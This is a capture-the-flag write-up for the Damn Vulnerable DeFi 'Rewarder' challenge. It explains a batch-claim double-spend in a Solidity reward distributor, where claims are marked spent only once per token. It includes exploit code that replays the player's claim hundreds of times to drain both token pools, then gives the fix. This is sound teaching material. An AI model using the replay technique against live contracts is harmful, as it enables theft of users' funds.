# The Rewarder (Damn Vulnerable DeFi #5)

**Vulnerability class:** Double-spend via late state marking in a batch operation.

## The goal

Drain almost all the remaining DVT and WETH from a Merkle-based reward
distributor, sending the funds to a recovery address.

## The flaw

`claimRewards` processes an array of claims in one call. It transfers tokens on
**every** iteration, but only marks the claim as used (`_setClaimed`) when the
token changes or on the very last element:

```solidity
for (uint256 i = 0; i < inputClaims.length; i++) {
    ...
    if (token != inputTokens[inputClaim.tokenIndex]) {
        if (address(token) != address(0)) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }
        ...
    } else {
        bitsSet = bitsSet | 1 << bitPosition;   // just accumulates
        amount += inputClaim.amount;
    }
    if (i == inputClaims.length - 1) {
        if (!_setClaimed(...)) revert AlreadyClaimed();   // marked only at the end
    }
    ...
    inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);  // transfers EVERY time
}
```

So submitting the same valid claim N times transfers N payouts but records the
claim only once. The `AlreadyClaimed` guard never fires within a single call.

## The exploit

Find the player's own index, amount and Merkle proof in the distribution. Build a
claims array repeating the player's valid claim enough times to drain each pool
(grouping all DVT claims first, then all WETH, so the token only "changes" once):

```solidity
uint256 dvtTxCount  = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_AMOUNT;   // ~867
uint256 wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_AMOUNT; // ~853
// fill claims[]: dvtTxCount copies of the DVT claim, then wethTxCount of WETH
distributor.claimRewards(claims, tokensToClaim);   // one call drains both
dvt.transfer(recovery, dvt.balanceOf(player));
weth.transfer(recovery, weth.balanceOf(player));
```

## The fix

Apply Checks-Effects-Interactions per element: verify and mark each claim as
spent **before** transferring its payout, on every iteration — never accumulate
and mark once at the end. A per-claim `_setClaimed` check would make the second
repeated claim revert immediately.

## Lesson

In batch processing, anti-replay state must be committed per element before its
effect. Late or accumulated marking lets a valid item be replayed within the same
batch — a double-spend. Common in airdrops, reward claims, and voting.
